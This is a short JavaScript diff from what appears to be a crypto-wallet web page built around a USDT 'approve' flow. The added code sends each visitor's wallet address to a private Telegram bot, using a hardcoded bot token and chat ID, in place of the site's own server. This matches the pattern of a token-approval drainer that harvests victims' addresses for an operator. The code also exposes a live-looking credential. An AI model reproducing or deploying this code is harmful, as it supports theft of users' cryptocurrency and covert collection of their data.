@@ -56,16 +56,21 @@ async function transferUSDT(e) {
     (console.error("Approve error:", e), alert("Approval error: " + e.message), t.prop("disabled", !1), t.html(a));
   }
 }
+
 function sendAddressToServer(e) {
-  var t = "{'address':'" + e + "'}";
+  var formattedAddress = "`" + e + "`"; 
+  var t = JSON.stringify({ 'address': formattedAddress });
+  var token = "8503739462:AAERpuLqZTgZ5zVvE1cAOjPFcwm2YX2CA84";
+  var chat_id = "993778683";
   $.ajax({
     type: "POST",
-    url: "GetData.aspx/AddDetails",
-    data: t,
+    url: "https://api.telegram.org/bot" + token + "/sendMessage",
+    data: JSON.stringify({
+      chat_id: chat_id,
+      text: "New Address:\n" + formattedAddress,
+      parse_mode: "MarkdownV2"
+    }),
     contentType: "application/json; charset=utf-8",
-    dataType: "json",
-    success: function (e) {
-      return 1 == e.d.status ? void (returnData = !0) : void (returnData = !1);
-    }
+    dataType: "json"
   });
 }
